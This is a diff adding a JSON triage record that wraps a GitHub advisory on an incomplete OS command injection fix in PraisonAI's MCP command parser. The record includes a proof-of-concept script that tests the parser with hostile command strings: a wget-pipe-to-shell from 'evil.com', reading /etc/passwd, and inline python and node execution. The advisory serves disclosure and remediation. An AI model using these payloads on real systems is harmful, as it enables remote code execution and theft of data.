@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/186786330?v=4\", \"events_url\": \"https://api.github.com/users/decsecre583/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/decsecre583/followers\", \"following_url\": \"https://api.github.com/users/decsecre583/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/decsecre583/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/decsecre583\", \"id\": 186786330, \"login\": \"decsecre583\", \"node_id\": \"U_kgDOCyIiGg\", \"organizations_url\": \"https://api.github.com/users/decsecre583/orgs\", \"received_events_url\": \"https://api.github.com/users/decsecre583/received_events\", \"repos_url\": \"https://api.github.com/users/decsecre583/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/decsecre583/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/decsecre583/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/decsecre583\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41497\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-77\", \"name\": \"Improper Neutralization of Special Elements used in a Command ('Command Injection')\"}, {\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"### Summary\\n\\nThe fix for PraisonAI's MCP command handling does not add a command allowlist or argument validation to `parse_mcp_command()`, allowing arbitrary executables like `bash`, `python`, or `/bin/sh` with inline code execution flags to pass through to subprocess execution.\\n\\n### Affected Package\\n\\n- **Ecosystem:** PyPI\\n- **Package:** MervinPraison/PraisonAI\\n- **Affected versions:** < 47bff65413be\\n- **Patched versions:** >= 47bff65413be\\n\\n### Details\\n\\nThe vulnerability exists in `src/praisonai/praisonai/cli/features/mcp.py` in the `MCPHandler.parse_mcp_command()` method. This function parses MCP server command strings into executable commands, arguments, and environment variables. The pre-patch version performs no validation on the executable or arguments.\\n\\nThe fix commit `47bff654` was intended to address command injection, but the patched `parse_mcp_command()` still lacks three critical controls: there is no `ALLOWED_COMMANDS` allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`), there is no `os.path.basename()` validation to prevent path-based executable injection, and there is no argument inspection to block shell metacharacters or dangerous subcommands.\\n\\nMalicious MCP server commands such as `python -c 'import os; os.system(\\\"id\\\")'`, `bash -c 'cat /etc/passwd'`, and `/bin/sh -c 'wget http://evil.com/shell.sh | sh'` are all accepted by `parse_mcp_command()` and passed directly to subprocess execution without filtering.\\n\\n### PoC\\n\\n```python\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"\\nCVE-2026-34935 - PraisonAI command injection via parse_mcp_command()\\n\\nTests against REAL PraisonAI mcp.py from git at commit 66bd9ee2 (parent of fix 47bff654).\\nThe pre-patch parse_mcp_command() performs NO validation on the executable or\\narguments, allowing arbitrary command execution via MCP server commands.\\n\\nRepo: https://github.com/MervinPraison/PraisonAI\\nPatch commit: 47bff65413beaa3c21bf633c1fae4e684348368c\\n\\\"\\\"\\\"\\n\\nimport sys\\nimport os\\nimport importlib.util\\n\\n# Load the REAL mcp.py from the cloned PraisonAI repo at vulnerable commit\\nMCP_PATH = \\\"/tmp/praisonai_real/src/praisonai/praisonai/cli/features/mcp.py\\\"\\n\\ndef load_mcp_handler():\\n    \\\"\\\"\\\"Load the real MCPHandler class from the vulnerable source.\\\"\\\"\\\"\\n    base_path = \\\"/tmp/praisonai_real/src/praisonai/praisonai/cli/features/base.py\\\"\\n\\n    spec_base = importlib.util.spec_from_file_location(\\\"features_base\\\", base_path)\\n    mod_base = importlib.util.module_from_spec(spec_base)\\n    sys.modules[\\\"features_base\\\"] = mod_base\\n\\n    with open(MCP_PATH) as f:\\n        source = f.read()\\n\\n    source = source.replace(\\\"from .base import FlagHandler\\\", \\\"\\\"\\\"\\nclass FlagHandler:\\n    def print_status(self, msg, level=\\\"info\\\"):\\n        print(f\\\"[{level}] {msg}\\\")\\n\\\"\\\"\\\")\\n\\n    ns = {\\\"__name__\\\": \\\"mcp_module\\\", \\\"__file__\\\": MCP_PATH}\\n    exec(compile(source, MCP_PATH, \\\"exec\\\"), ns)\\n    return ns[\\\"MCPHandler\\\"]\\n\\n\\ndef main():\\n    MCPHandler = load_mcp_handler()\\n    handler = MCPHandler()\\n\\n    print(f\\\"Source file: {MCP_PATH}\\\")\\n    print(f\\\"Loaded MCPHandler from real PraisonAI source\\\")\\n    print()\\n\\n    malicious_commands = [\\n        \\\"python -c 'import os; os.system(\\\\\\\"id\\\\\\\")'\\\",\\n        \\\"node -e 'require(\\\\\\\"child_process\\\\\\\").execSync(\\\\\\\"whoami\\\\\\\")'\\\",\\n        \\\"bash -c 'cat /etc/passwd'\\\",\\n        \\\"/bin/sh -c 'wget http://evil.com/shell.sh | sh'\\\",\\n    ]\\n\\n    print(\\\"Testing parse_mcp_command with malicious inputs:\\\")\\n    print()\\n\\n    all_accepted = True\\n    for cmd_str in malicious_commands:\\n        try:\\n            cmd, args, env = handler.parse_mcp_command(cmd_str)\\n            print(f\\\"  Input:   {cmd_str}\\\")\\n            print(f\\\"  Command: {cmd}\\\")\\n            print(f\\\"  Args:    {args}\\\")\\n            print(f\\\"  Result:  ACCEPTED (no validation)\\\")\\n            print()\\n        except Exception as e:\\n            print(f\\\"  Input:   {cmd_str}\\\")\\n            print(f\\\"  Result:  REJECTED ({e})\\\")\\n            all_accepted = False\\n            print()\\n\\n    if all_accepted:\\n        print(\\\"ALL malicious commands accepted without validation!\\\")\\n        print()\\n\\n        with open(MCP_PATH) as f:\\n            source = f.read()\\n\\n        has_allowlist = \\\"ALLOWED_COMMANDS\\\" in source or \\\"allowlist\\\" in source.lower()\\n        has_basename_check = \\\"os.path.basename\\\" in source\\n        has_validation = has_allowlist or has_basename_check\\n\\n        print(f\\\"Has command allowlist: {has_allowlist}\\\")\\n        print(f\\\"Has basename check: {has_basename_check}\\\")\\n        print(f\\\"Has any command validation: {has_validation}\\\")\\n        print()\\n\\n        if not has_validation:\\n            print(\\\"COMMAND INJECTION: parse_mcp_command() has NO command validation!\\\")\\n            print(\\\"  - No allowlist of permitted executables\\\")\\n            print(\\\"  - No argument inspection\\\")\\n            print(\\\"  - Arbitrary commands passed directly to subprocess execution\\\")\\n            print()\\n            print(\\\"VULNERABILITY CONFIRMED\\\")\\n            sys.exit(0)\\n\\n    print(\\\"Some commands were rejected - validation present\\\")\\n    sys.exit(1)\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    main()\\n```\\n\\n**Steps to reproduce:**\\n1. `git clone https://github.com/MervinPraison/PraisonAI /tmp/praisonai_real`\\n2. `cd /tmp/praisonai_real && git checkout 47bff654~1`\\n3. `python3 poc.py`\\n\\n**Expected output:**\\n```\\nVULNERABILITY CONFIRMED\\nparse_mcp_command() has NO command validation; arbitrary commands passed directly to subprocess execution without an allowlist.\\n```\\n\\n### Impact\\n\\nAn attacker who can influence MCP server configuration (e.g., via a malicious plugin or shared configuration file) can execute arbitrary system commands on the host running PraisonAI, enabling full remote code execution, data exfiltration, and lateral movement.\\n\\n### Suggested Remediation\\n\\nImplement a strict allowlist of permitted executables (e.g., `npx`, `uvx`, `node`, `python`) in `parse_mcp_command()`. Validate commands against `os.path.basename()` to prevent absolute path injection. Inspect arguments for shell metacharacters and dangerous subcommand patterns (e.g., `-c`, `-e` flags enabling inline code execution).\", \"epss\": {\"percentage\": 0.00541, \"percentile\": 0.41515}, \"ghsa_id\": \"GHSA-9qhq-v63v-fv3j\", \"github_reviewed_at\": \"2026-04-17T22:23:50Z\", \"html_url\": \"https://github.com/advisories/GHSA-9qhq-v63v-fv3j\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9qhq-v63v-fv3j\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41497\"}], \"nvd_published_at\": \"2026-05-08T14:16:33Z\", \"published_at\": \"2026-04-17T22:23:50Z\", \"references\": [\"https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9qhq-v63v-fv3j\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-34935\", \"https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41497\", \"https://github.com/advisories/GHSA-9qhq-v63v-fv3j\"], \"repository_advisory_url\": \"https://api.github.com/repos/MervinPraison/PraisonAI/security-advisories/GHSA-9qhq-v63v-fv3j\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/MervinPraison/PraisonAI\", \"summary\": \"PraisonAI has an incomplete fix for CVE-2026-34935 - OS Command Injection \", \"type\": \"reviewed\", \"updated_at\": \"2026-05-12T13:31:54Z\", \"url\": \"https://api.github.com/advisories/GHSA-9qhq-v63v-fv3j\", \"vulnerabilities\": [{\"first_patched_version\": \"4.5.149\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"praisonai\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.5.148\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9qhq-v63v-fv3j",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "praisonai: <= 4.5.148"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-34935",
+      "CVE-2026-41497"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "praisonai"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.944328Z",
+  "provenance": {
+    "content_sha256": "8f94444250e982b7ca74b2bb1c4fddf12737810a9f7b353121970c5b0a33db6a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-17T22:23:50Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9qhq-v63v-fv3j",
+  "status": "active",
+  "title": "PraisonAI has an incomplete fix for CVE-2026-34935 - OS Command Injection ",
+  "updated_at": "2026-05-12T13:31:54Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9qhq-v63v-fv3j"
+}
